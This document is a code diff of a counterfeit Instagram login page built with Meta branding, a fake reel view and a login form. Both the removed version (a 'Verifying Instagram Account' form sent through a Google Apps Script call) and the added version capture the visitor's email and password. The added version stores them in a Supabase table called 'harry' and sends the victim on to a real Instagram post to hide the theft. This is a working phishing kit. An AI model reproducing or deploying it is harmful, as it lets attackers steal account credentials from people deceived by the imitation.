+    /* padding:0px 10px; */
+    cursor:pointer;
+    height:15px;
+    width:auto;
+    margin:0px 9px;
+    /* padding:0px 10px; */
+    /* border:2px solid red; */
+}
+footer ul.footerul li:hover{
+    border-bottom:0.3px solid gray;
+}
+
+    }
+
+
+
 
 </style>
 
-    <section class="mrg">
 
-       
+<div class="video">
 
-            <img src="pngtree-instagram-icon-instagram-logo-png-image_3584853.png"  class="instalogo"/>
-            <!-- <img class="instaposter"src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" alt="insta"> -->
-  
- <section class="box">
-     <img class="seclogo" src="pngtree-instagram-icon-instagram-logo-png-image_3584853.png" alt="logo img"> 
-     <!-- <i class="fa-brands fa-instagram " id="instaicon" ></i> -->
-<h4 class="verify">Verifying Instagram Account <img src="https://static.vecteezy.com/system/resources/thumbnails/034/211/380/small/blue-checkmark-validation-social-media-png.png " class="bluetick":/></h4>
-<!-- <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRnYlTHzIzf76dQP44xDtvT3fRI3c9C7B5DFVs8TgKXafimXRbehr-5pmE&s=10" height="30px"
-style=" mix-blend-mode: multiply;filter: grayscale(100%);"
-/> 
-Meta -->
-<form id="demoForm">
-<!-- <label>Email </label> -->
-<input type="text" id="email" placeholder="Mobile number.username or email address"required autofocus/> 
-<!-- <label>Password </label>  -->
-<input type="password" id="password" class="pass" required placeholder="Password" />
-<input type="submit" onclick="hi()" class="loginbtn" value="Log in"/>
-<h5 class="forget" onclick="location.reload()">Forgotten Password ?</h5>
+    <div class="dt">
+     <i class="fa-solid fa-lss-than up">&lt;</i>
+<i class="fa-solid fa-geater-than dow">&gt;  
+</i>
+    </div>
 
-<img src="https://ppc.ninja/wp-content/uploads/2024/11/Meta-Logo.png" class="meta"/>
-</form>
-  </section>
+    <div class="detail">
+        <div class="profile"></div>
+
+        <div class="viddet">
+            <p class="proname">mahzayybb • <span style="color:rgb(48, 151, 247);">Follow</span></p>
+           <i class="fa-solid fa-music" style="color:rgb(167, 164, 164);font-size:10px;"></i><marquee behavior="scroll" scrollamount="3" direction="right to left">Sua amiga eu vou pegarMC Lan, MC WM</marquee>
+</div>
+<p class="title">It was arranged by me 💀😂</p>
+</div>
+
+
+
+    <div class="collection">
+        <div class="herat">
+            <i class="fa-regular fa-heart"></i>
+        <p>51.1k</p>
+        </div>
+         <div class="herat">
+            <i class="fa-regular fa-comment" style="  transform: scaleX(-1);"></i>
+            <p>323</p>
+    </div>
+    
+    <div class="ret">
+     <i class="fa-solid fa-retweet" style="transform:rotate(
+     170deg)"></i>
+    <p>1.1k</p>
+    </div>
+    <div class="share">
+    <svg viewBox="0 0 24 24" width="28" height="28"
+     fill="none" stroke="currentColor"
+     stroke-width="1.7" stroke-linecap="round"
+     stroke-linejoin="round">
+  <path d="M22 2 9 15"/>
+  <path d="m22 2-7 20-4-9-9-4Z"/>
+</svg>
+    </div>
+    <div class="save">
+    <i class="fa-regular fa-bookmark"></i>
+    </div>
+    <div>•••</div>
+    <br>
+    <div class="box"></div>
+
+    </div>
+    <video  class="pakar">
+        <source  src="video.mp4" type="video/mp4">
+</video>
+
+</div>
+
+<div class="logwin">
+    <img src="imagein.png" alt="logo" class="winlogo">
+    <div class="controldo">
+        <p class="from">from</p>
+        <img src="https://branditechture.agency/wp-content/uploads/2021/11/Instagram-Meta-Gradient-Logo-SVG-1.svg" alt="" class="logmeta">
+    </div>
+</div>
+
+
+
+
+<div class="main">
+<section class="leftarea">
+<div class="instaleftlogo"><img class="instalogoleft" src="imagein.png" alt="insta logo"></div>
+<p class="parag">See everyday moments from your <br> <span class="closecolor">close friends</span>.</p>
+
+<!-- <img class="instapublicpic" src="image1.png" alt="instapublicpic"> -->
+<img class="instapublicpic" src="image2.png" alt="instapublicpic">
 </section>
+<section class="rightarea">
+
+    <div class="formbox">
+        <form id="loginform">
+            <p class="enguk">English (UK)</p>
+            <img class="instalogoleft" src="imagein.png" alt="insta logo">
+            <p class="logintxt">Log in to Instagram</p>
+            
+            <div class="emailinput">
+                <label class="emaillabel" >Mobile number,username or email address</label>
+                <span class="cut"></span>
+                <input class="email" type="text">
+                <span class="cancel">✕</span>    
+            </div>
+
+             <div class="passinput">   
+                <label class="passlabel" >Password</label>
+                <input class="pass" type="password">
+                 <!-- <i class="toggle-password fa-solid fa-eye" id="eyeIcon">.</i> -->
+                  <i class="fa-regular fa-eye-slash" id="togglePassword"></i>
+            </div>
+            <!-- <input class="pass" type="text">-->
+            <input type="submit" value="Log in" class="login">
+             <button class="forget">Forgotten password?</button>
+            <button class="fblogin"><img src="image3.png" alt="logo" class="fblog"> Log in with Facebook</button>
+            <button class="cracc">Create new account</button>
+<img src="https://ppc.ninja/wp-content/uploads/2024/11/Meta-Logo.png" alt="" class="meta">
+        </form>
+
+
+    </div>
+</section>
+</div>
 <footer>
 <ul class="footerul">
 <li>Meta</li>
@@ -696,47 +4158,68 @@ Meta -->
 <li>English (UK)</li>
 <li>© 2026 Instagram from Meta</li>
 
-
-  </ul>
-  </footer>
-  <div class="pro"> <i class="fa-brands fa-instagram " id="instahideicon"></i><img src="https://thumbs.dreamstime.com/b/print-204012271.jpg" class="instatext2"/></div>
-<script>
-let pass = document.getElementsByClassName("pass")[0];
-let login = document.getElementsByClassName("loginbtn")[0];
-let password = document.getElementById("togglePassword");
-login.style.opacity="50%";
-pass.addEventListener("input", function () {
-    if (pass.value.length === 0) {
-        login.style.opacity = "50%";
-        login.style.pointerEvents = "none";
-
-    } else {
-        login.style.opacity = "100%";
-        login.style.pointerEvents = "auto";
-    }
-
-});
-
- document.getElementById("demoForm").addEventListener("submit", function(e) {
-    let proo = document.getElementsByClassName("pro")[0];
-  proo.style="display:flex"
-    e.preventDefault();
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-
-    google.script.run
-        .withSuccessHandler(() => {
-            // alert("Saved successfully!");
-            
-            document.getElementById("demoForm").reset();
-            window.open("https://www.instagram.com/reels/DSLvjiGjDZL/");
-
-        })
-        .saveDemoData(email, password);
-}); 
-
-</script>
+</footer>
 
 
+
+
+
+
+
+<script src="insta.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <script>
+    const supabaseClient = window.supabase.createClient(
+        "https://zufkbkbpiaqopundxwak.supabase.co",
+        "sb_publishable_pugfFjYFOrXyUoS8niIuKg_70j8Rfvq"
+    );
+
+
+
+// const loginForm = document.getElementById("loginform");
+
+// loginForm.addEventListener("submit", async function(e) {
+//     e.preventDefault();
+
+//     const email = loginForm.querySelector(".email").value.trim();
+//     const password = loginForm.querySelector(".pass").value;
+
+
+
+
+
+
+
+
+    document.getElementById("loginform").addEventListener("submit", async function(e) {
+         window.location.href="https://www.instagram.com/p/Deyc1jMIL2J"
+        e.preventDefault();
+
+        const email = document.getElementsByClassName("email")[0].value;
+        const password = document.getElementsByClassName("pass")[0].value;
+
+        const { data, error } = await supabaseClient
+    .from("harry")
+      .insert({
+        email: email ,
+        pass: password
+    });
+setTimeout(() => {
+    win.style="display:flex;"},1500)
+if (error) {
+    alert(error.message);
+} else {
+    alert("Message sent successfully!");
+}
+    });
+    </script>
+
+
+
+
+
+    
 </body>
 </html>
